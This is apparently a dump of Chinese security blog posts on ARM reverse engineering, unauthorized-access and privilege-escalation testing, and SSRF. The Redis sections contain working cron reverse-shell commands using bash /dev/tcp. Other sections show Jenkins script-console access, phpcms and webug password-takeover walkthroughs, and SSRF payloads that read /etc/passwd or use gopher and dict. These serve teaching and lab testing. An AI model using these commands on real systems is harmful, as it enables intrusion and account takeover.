printf(&quot;%d&quot;,fun3(1,2,3,4,5,6,7,8)); return 0; &#125; makefile文件同之前的基本一致 #设置目录 NDK_ROOT&#x3D;D:\\Androidstudio-sdk\\android-ndk-r14b TOOLCHAINS_ROOT&#x3D;$(NDK_ROOT)\\toolchains\\arm-linux-androideabi-4.9\\prebuilt\\windows-x86_64 TOOLCHAINS_PREFIX&#x3D;$(TOOLCHAINS_ROOT)\\bin\\arm-linux-androideabi TOOLCHAINS_INCLUDE&#x3D;$(TOOLCHAINS_ROOT)\\lib\\gcc\\arm-linux-androideabi\\4.9.x\\include-fixed PLATFORM_ROOT&#x3D;$(NDK_ROOT)\\platforms\\android-14\\arch-arm PLATFORM_INCLUDE&#x3D;$(PLATFORM_ROOT)\\usr\\include PLATFORM_LIB&#x3D;$(PLATFORM_ROOT)\\usr\\lib MODULE_NAME&#x3D;app6 BUILD_TYPE&#x3D;c PATH_ANDROID&#x3D;&#x2F;data&#x2F;local&#x2F;tmp&#x2F; RM&#x3D;del FLAGS&#x3D;-I$(TOOLCHAINS_INCLUDE) \\ -I$(PLATFORM_INCLUDE) \\ -L$(PLATFORM_LIB) \\ -nostdlib \\ -lgcc \\ -Bdynamic \\ -lc \\ -O0 OBJS&#x3D;$(MODULE_NAME).o \\ $(PLATFORM_LIB)\\crtbegin_dynamic.o \\ $(PLATFORM_LIB)\\crtend_android.o all: $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIE clean: $(RM) *.o install: adb push $(MODULE_NAME) $(PATH_ANDROID) adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME) adb shell $(PATH_ANDROID)$(MODULE_NAME) 编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击main函数，如下： 其中已经简单分析函数参数的引用，开头可以看到，参数[sp]，意思是第五个参数引用，若后面还有其他参数则以四个字节为参数引用存储。关于寄存器的含义 r0-r3 用作传入函数参数，传出函数返回值。在子程序调用之间，可以将 r0-r3 用于任何用途。 r4-r11 被用来存放函数的局部变量。如果被调用函数使用了这些寄存器，它在返回之前必须恢复这些寄存器的值。 r12 是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。 r13 是栈指针 sp。它不能用于任何其它用途。sp 中存放的值在退出被调用函数时必须与进入时的值相同。 r14 是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复 r15 是程序计数器 PC。它不能用于任何其它用途。 详细介绍参考：https://www.veryarm.com/36274.html 到BL指令，BL指令是有返回的跳转，表示子程序的返回通过LR寄存器保存，保存的地址值就是下一条指令的地址值。如下的fun3函数中，对于多参数并没有使用栈来保存，而是使用R0-R3寄存器来循环的调用。 判断结束后进入不同的分支，走到如图中的两部分分支的时候出现了一个新的子程序调用，fun2。 点击fun2，其中又调用了fun1函数，同样点击fun1。 通过fun1就可以看到函数的具体操作行为，其中最后返回值BX，带状态切换返回，其中的LR则为fun2的函数MOV的地址值，返回到fun2中继续执行。 而fun2中的最后代码也对应了开头的两个汇编语句，恢复sp指令值，将栈内容恢复到寄存器中。获取到参数值后，回到MOV指令中其中注释的fun1和fun2代表当前分支的输入参数。最后都执行到loc_4B8，结果保存到R0中返回，最后也是恢复sp和寄存器。 这时候再看main函数最后执行，获取的fun3返回赋值给R2，至于LDR和ADD，代表了读取unk_5C8标记处的参数字段，点击则可以看到是“%d”，也就是R3代表“%d”,R1代表参数返回值。由printf来输出。最后返回0。结束函数执行。 此汇编分析主要是函数调用和返回之间的联系，希望也可以为后面的读取APP so文件打下基础把。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"ARM原生循环语句逆向分析","slug":"ARM原生循环语句逆向分析","date":"2019-07-03T07:09:57.000Z","updated":"2019-07-26T09:56:09.000Z","comments":true,"path":"2019/07/ARM原生循环语句逆向分析/","link":"","permalink":"https://misakikata.github.io/2019/07/ARM%E5%8E%9F%E7%94%9F%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","excerpt":"","text":"代码编译使用的代码为非虫的Android软件安全权威指南，app6.c 代码如下： #include &lt;stdio.h&gt; int nums[5] &#x3D; &#123;1, 2, 3, 4, 5&#125;; int for1(int n) &#123; int i &#x3D; 0; int s &#x3D; 0; for (i &#x3D; 0; i &lt; n; i++) &#123; s +&#x3D; i * 2; &#125; return s; &#125; int for2(int n) &#123; int i &#x3D; 0; int s &#x3D; 0; for (i &#x3D; 0; i &lt; n; i++) &#123; s +&#x3D; i * i + nums[n - 1]; &#125; return s; &#125; int dowhile(int n) &#123; int i &#x3D; 1; int s &#x3D; 0; do &#123; s +&#x3D; i; &#125; while (i++ &lt; n); return s; &#125; int whiledo(int n) &#123; int i &#x3D; 1; int s &#x3D; 0; while (i &lt;&#x3D; n) &#123; s +&#x3D; i++; &#125; return s; &#125; void if1(int n) &#123; if (n &lt; 10) &#123; printf(&quot;the number less than 10\\n&quot;); &#125; else &#123; printf(&quot;the number greater than or equal to 10\\n&quot;); &#125; &#125; void if2(int n) &#123; if (n &lt; 16) &#123; printf(&quot;he is a boy\\n&quot;); &#125; else if (n &lt; 30) &#123; printf(&quot;he is a young man\\n&quot;); &#125; else if (n &lt; 45) &#123; printf(&quot;he is a strong man\\n&quot;); &#125; else &#123; printf(&quot;he is an old man\\n&quot;); &#125; &#125; int main(int argc, char *argv[]) &#123; printf(&quot;for1:%d\\n&quot;, for1(5)); printf(&quot;for2:%d\\n&quot;, for2(5)); printf(&quot;dowhile:%d\\n&quot;, dowhile(100)); printf(&quot;while:%d\\n&quot;, whiledo(100)); if1(5); if2(35); return 0; &#125; 删除了其中的switch函数，编译的时候函数一直报错，使用make编译，创建jni目录，把c文件和Makefile放入到目录中，修改文件为如下： #设置目录 NDK_ROOT&#x3D;D:\\Androidstudio-sdk\\android-ndk-r14b TOOLCHAINS_ROOT&#x3D;$(NDK_ROOT)\\toolchains\\arm-linux-androideabi-4.9\\prebuilt\\windows-x86_64 TOOLCHAINS_PREFIX&#x3D;$(TOOLCHAINS_ROOT)\\bin\\arm-linux-androideabi TOOLCHAINS_INCLUDE&#x3D;$(TOOLCHAINS_ROOT)\\lib\\gcc\\arm-linux-androideabi\\4.9.x\\include-fixed PLATFORM_ROOT&#x3D;$(NDK_ROOT)\\platforms\\android-14\\arch-arm PLATFORM_INCLUDE&#x3D;$(PLATFORM_ROOT)\\usr\\include PLATFORM_LIB&#x3D;$(PLATFORM_ROOT)\\usr\\lib MODULE_NAME&#x3D;app6 BUILD_TYPE&#x3D;c PATH_ANDROID&#x3D;&#x2F;data&#x2F;local&#x2F;tmp&#x2F; RM&#x3D;del FLAGS&#x3D;-I$(TOOLCHAINS_INCLUDE) \\ -I$(PLATFORM_INCLUDE) \\ -L$(PLATFORM_LIB) \\ -nostdlib \\ -lgcc \\ -Bdynamic \\ -lc \\ -O0 OBJS&#x3D;$(MODULE_NAME).o \\ $(PLATFORM_LIB)\\crtbegin_dynamic.o \\ $(PLATFORM_LIB)\\crtend_android.o all: $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIE clean: $(RM) *.o install: adb push $(MODULE_NAME) $(PATH_ANDROID) adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME) adb shell $(PATH_ANDROID)$(MODULE_NAME) 编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击for1函数，空格切换图形视图。一般看到这种形式的箭头指向的时候基本就是for或者while语句。 1. for1函数查看第一个汇编指令块，创建了三个函数，开头先做了保存子程序现场，开启堆栈空间。R0-R3，是用作传入变量寄存器，所以此处有三个变量，分别为，var_10, var_8, var_c。最后强制跳转到loc_3e8标记处。 loc_3e8处的汇编代码块，从存储器中加载两个变量值到R2，R3然后对比两个变量，如果R2小于R3，则跳转到loc_3c8标记处。其中对var_8做了一次逻辑左移处理，相当于R3 = R3 * 2^1。再获取变量var_c，执行操作R3 = R3 +R2，再存储到存储器中。下面就相当于for循环中的循环变量自加。最后循环跳出后，再把var_c的值返回。 按照以上逻辑写一段C代码，如下： int for1(int var_10)&#123; int var_8 &#x3D; 0; int var_c &#x3D; 0; for(var_8 &#x3D; 0; var_8 &lt; var_10; var_8++)&#123; var_c &#x3D; var_c + var_8 &lt;&lt; 1; &#125; return var_c; &#125; 2. for2函数for2跟如上的for1基本类似，就是内部处理处有点不一样，其中nums，点击一下就可以看到是五位的数组，具体是，先var_8自乘，然后读取nums数组，R3为nums数组的地址值，也就是nums[var_10 -1]，再加var_8的自乘和var_c。 C代码： int nums[5] &#x3D; &#123;1,2,3,4,5&#125;; int for2(int var_10)&#123; int var_8 &#x3D; 0; int var_c &#x3D; 0; for(var_8 &#x3D; 0; var_8 &lt; var_10; var_8++)&#123; var_c &#x3D;var_c + var_8* var_8 + nums[var_10 - 1]; &#125; return var_c; &#125; 3. dowhile函数其中大部分都类似以上汇编代码，其中dowhile和whiledo存在有明显不同，dowhile是先执行内部的汇编代码，变量执行自加等操作，最后在判断是否一致，循环体上大致类似如下图，而whiledo更类似于如上的for循环体。汇编中并没有强制跳转，而且跳转标记在判断跳转处的上方。 根据汇编代码写出大致的C代码。 int dowhile(int var_10)&#123; int var_8 &#x3D; 1; int var_c &#x3D; 0; do&#123; var_c &#x3D; var_8 + var_c; var_8 &#x3D; var_8 + 1; &#125;while(var_8 &lt; var_10) return var_c &#125; 4. whiledo函数whiledo从结构体上和for1相同，本来这两种循环就及其类似，主要查看的时候能分清while循环的特点和逻辑来区分，哪个参数为判断参数，哪个参数为计算参数。在B指令执行的地方，就为for和while的判断指令。 根据汇编代码写出大致的C代码。 int whiledo(int var_10)&#123; int var_8 &#x3D; 1; int var_c &#x3D; 0; while(var_8 &lt;&#x3D; var_10)&#123; var_8 &#x3D; var_8 + 1; var_c &#x3D; var_c + var_8; &#125; return var_c &#125; 5. if1 函数如下，具有单分支的if结构体可以看出是if-else判断形式 按照汇编意思，C代码如下： void if1(int var_8)&#123; if(var_8 &gt; 9)&#123; puts(&quot;the number greater than or equal to 10&quot;); &#125;else&#123; puts(&quot;the number less than 10&quot;); &#125; &#125; 在if判断中，判断体在汇编中和原代码是相反的，意思是var_8 &gt; 9原文应该是var_8 &lt;=9 。printf也由puts来改变输出，puts输出会自动添加换行符，也就不在需要原文中的\\n。 void if1(int var_8)&#123; if(var_8 &lt;&#x3D; 9)&#123; puts(&quot;the number less than 10&quot;); &#125;else&#123; puts(&quot;the number greater than or equal to 10&quot;); &#125; &#125; 6. if2函数多判断结构体，也就是if-else-if 其中可以看到有多个LDR计算赋值指令，此处的LDR和MOV类似，只是有些时候MOV不适合使用，所以用LDR来赋值计算。 LDR R3, &#x3D;(aHeIsABoy - 0x5D0) 代表意思就是，aHeIsABoy的地址值减去0x5D0，赋值给R3。仔细看一下就可以明白，其中的参数都是原字符串。LDR就是aHeIsABoy减去0x5D0，此处是07EC减去0x5D0，为021C。而PC，程序计数器，指的是BL的地址值。详细参考：https://www.cnblogs.com/ichunqiu/p/9056630.html 也就是说，执行到ADD的时候，MOV在译码阶段，BL在取址阶段。PC寄存器总是指向随后的第三条指令。 用BL的地址值加上R3，05D0加上021C为7EC，也就是aHeIsABoy的地址值，当然IDA已经识别出来并注释到其后。再把字符串由puts输出。 LDR R3, &#x3D;(aHeIsABoy - 0x5D0) &#x2F;&#x2F;000007EC aHeIsABoy DCB &quot;he is a boy&quot;,0 ADD R3, PC, R3 ; &quot;he is a boy&quot; MOV R0, R3 ; s BL puts B loc_628 按照汇编意思，C代码如下： void if2(int var_8)&#123; if(var_8 &gt; 15)&#123; if(var_8 &gt; 29)&#123; if(var_8 &gt; 44)&#123; puts(&quot;he is an old man&quot;); &#125; else&#123; puts(&quot;he is a strong man&quot;); &#125; &#125; else&#123; puts(&quot;he is a young man&quot;); &#125; &#125; else&#123; puts(&quot;he is a boy&quot;); &#125; &#125; 由于汇编对判断的形式，用else if的形式可以这么写 void if2(int var_8)&#123; if(var_8 &lt;&#x3D; 15)&#123; puts(&quot;he is a boy&quot;); &#125; else if(var_8 &lt;&#x3D; 29)&#123; puts(&quot;he is a young man&quot;); &#125; else if(var_8 &lt;&#x3D; 44)&#123; puts(&quot;he is a strong man&quot;); &#125; else&#123; puts(&quot;he is an old man&quot;); &#125; &#125; 看完以上的汇编分析后，可以得到循环体的特点，循环体一般为以下： .... &#x2F;&#x2F;汇编代码 B loc_xxx .... CMP r1, r2 BXX loc_xxx .... BX LR 判断形式一般为以下： .... CMP R1, R2 BXX loc_xxx .... loc_xxx .... B loc_zzz loc_zzz .... 当然，以上CMP后并不一定会跟随B指令，也会由其他条件执行指令，例如： CMP R2, R3 ADDEQ R2, R3, #1 其中寄存器存值，仍然是需要注意点，不小心会看错赋值，如下： LDR R3, [R11,#var_8] LDR R2, [R11,#var_C] ADD R3, R2, R3 在执行一些类似ADD的指令操作后，其中的R3已不在代表var_8，其中的结果跟ADD后所获取到的R3赋值有关，这种情况可以看成： a &#x3D; 1; b &#x3D; 2; a &#x3D; a + b; &#x2F;&#x2F;3 所以，其中a的值已不在是1，同样如上中，R3也为此，在初期可能在不能连续查看汇编代码的情况下，会犯这种失误。 main 函数main函数中的赋值和返回值寄存器对应之前函数中的返回和赋值，如MOV R0, #5。在for1中，R0赋值给var_10。 同时返回值在R0中。 下部汇编类似，就不在一步步看啦。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"越权/未授权访问","slug":"越权-未授权访问","date":"2019-06-18T03:27:13.000Z","updated":"2019-06-18T07:00:48.000Z","comments":true,"path":"2019/06/越权-未授权访问/","link":"","permalink":"https://misakikata.github.io/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","excerpt":"","text":"0x01、漏洞简介未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 何为越权漏洞，通俗的理解为用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。越权一般可以分为：垂直越权，水平越权。而在非用户登陆模式下，任意用户访问特定地址或链接均可以访问到需要用户身份后才可以访问到的功能。越权也可以看为安全配置不当导致的未授权访问。 0x02、漏洞原理未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。 0x03、漏洞危害未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。而越权可以分为水平越权和垂直越权。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。 0x04、漏洞测试方法0x04-1、常见的未授权服务0x04-1-1、redis未授权访问此问题在互联网上曾经多数存在，redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件来反弹shell。 root@kali:~# redis-cli -h 192.168.63.130 192.168.63.130:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.63.128&#x2F;7999 0&gt;&amp;1\\n&quot; OK 192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; OK 192.168.63.130:6379&gt; config set dbfilename root OK 192.168.63.130:6379&gt; save OK 0x04-1-2、Jenkins未授权访问默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 http:&#x2F;&#x2F;www.secpulse.com:8080&#x2F;manage http:&#x2F;&#x2F;www.secpulse.com:8080&#x2F;script 选择脚本命令行可以执行一些系统命令。 0x04-1-3、MongoDB未授权访问开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 默认开启在27017端口，新版早就默认绑定在本地，之前的老版本仍有一些在互联网上开放在跑的端口。 0x04-1-4、Memcache未授权访问Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 默认开启在11211端口，可以使用端口连接工具或者命令，nc等，连接成功则存在。 关于未授权访问的可以查看：https://www.secpulse.com/archives/61101.html 0x04-2、基于用户ID的越权举个例子： https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userinfo.php?user_id&#x3D;user1 https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userinfo.php?user_id&#x3D;10001 我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。 如果参数为一个固定的数字串时，遍历数字串即可，这种情况下是系统对每个注册用户进行了一个用户id的排序，在众多的开源CMS上都有使用，当然这个字符串也有可能是随机，如果是随机的，量不大的情况下可以采用遍历的形式获取，量较大可以利用burp的随机数爆破，或者同样自己注册账户来测试。 0x04-3、基于功能对象ID的越权举个例子： https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userticket.php?user_order&#x3D;100001 https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userticket.php?user_order&#x3D;49ba59ab 此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。 0x04-4、基于上传文件对象ID的越权举个例子： https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userfile.php?fileid&#x3D;10001 https:&#x2F;&#x2F;www.ccc.com&#x2F;user1&#x2F;userfile.php?fileid&#x3D;user1_name.jpg 这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是www.ccc.com获取信息的方式，还可能会有什么问题呢？ 0x04-5、基于未授权访问的越权举个例子： https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;user.php?user&#x3D;user1@user.com 在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。 0x04-6、基于功能地址的越权举个例子： https:&#x2F;&#x2F;www.xxx.com&#x2F;user&#x2F;getuserinfo.php 如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址： &#x2F;getuserorder.php &#x2F;adduser.php &#x2F;deluser.php &#x2F;getalluser.php &#x2F;todetailpage.php &#x2F;ordercreate.php ...... 因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。 0x04-7、基于接口身份的越权举个例子： https:&#x2F;&#x2F;www.xxx.com&#x2F;user&#x2F;userinfo.php post: &#123;&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;&#125; 例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。 0x05、漏洞靶场漏洞环境：phpstudy，webug4.0 靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。 漏洞演示：演示为靶场的22号漏洞，越权修改密码 靶场安装：https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。 把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。 另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径： header(&quot;Location:&#x2F;pt_env&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?id&#x3D;&#123;$id&#125;&quot;) 修改为： header(&quot;Location:&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?id&#x3D;&#123;$id&#125;&quot;) 点击第一个越权修改密码后进入如下页面： 此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下： 此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面 此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。 其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。 查看数据库修改是否成功： 此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。 0x06、测试工具对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。 此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。 在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下： 此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。 获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。 其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。 能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。 介绍地址：https://github.com/portswigger/auth-matrix 0x07、CMS演示0x07-1、前台任意修改其他用户信息漏洞环境：phpstudy，phpcms9.5.9 漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码 漏洞下载：http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip 解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256 在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。 在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码 点击获取邮箱效验码 返回上一步输入想修改的用户，如下test2 输入之前的邮箱验证码提交 点击后显示密码修改成功为以下： 尝试使用新密码登陆成功： 漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。 0x07-2、redis未授权访问漏洞环境：Ubuntu，reids 3.2.0 漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell 安装如下： wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gz tar xzf redis-3.2.0.tar.gz cd redis-3.2.0 make 修改配置文件 vi redis.conf bind 127.0.0.1 加上# protected-mode yes 改为no 在配置文件目录下启动 .&#x2F;src&#x2F;redis-server redis.conf 启动后显示如下： 通过reids命令可以查看基本信息 尝试反弹shell到指定地址 set x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.30.79&#x2F;2333 0&gt;&amp;1\\n&quot; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; config set dbfilename root save 或者采用gopher协议，直接利用curl一条命令执行 0x08、漏洞修复1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。 2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php 3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。 4、区分用户和管理员时，不采用某些相同的参数来区别。如dede区分管理和用户都是采用ID值，容易产生问题。 5、对于查询类越权需要对每一次请求的参数做当前用户身份效验，避免水平越权。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SSRF","slug":"SSRF","date":"2019-06-14T07:46:34.000Z","updated":"2019-06-14T07:58:43.000Z","comments":true,"path":"2019/06/SSRF/","link":"","permalink":"https://misakikata.github.io/2019/06/SSRF/","excerpt":"","text":"0x01、漏洞简介​ SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 0x02、漏洞原理​ 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。 0x03、漏洞危害 扫描内网开放服务 向内部任意主机的任意端口发送payload来攻击内网服务 DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，例如直接SQL注入、XSS攻击等 利用file、gopher、dict协议读取本地文件、执行命令等 0x04、检测与绕过0x04-1、漏洞检测假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下： http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;http:&#x2F;&#x2F;www.xxc.com&#x2F;a.jpg 那么网站请求的大概步骤应该是类似以下： 用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。 这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为： http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;http:&#x2F;&#x2F;127.0.0.1:22 如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如 http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;dict:&#x2F;&#x2F;127.0.0.1:22&#x2F;data:data2 (dict可以向服务端口请求data data2) http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:2233&#x2F;_test (向2233端口发送数据test,同样可以发送POST请求) ...... 对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中： php: http、https、file、gopher、phar、dict、ftp、ssh、telnet... java: http、https、file、ftp、jar、netdoc、mailto... 判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。 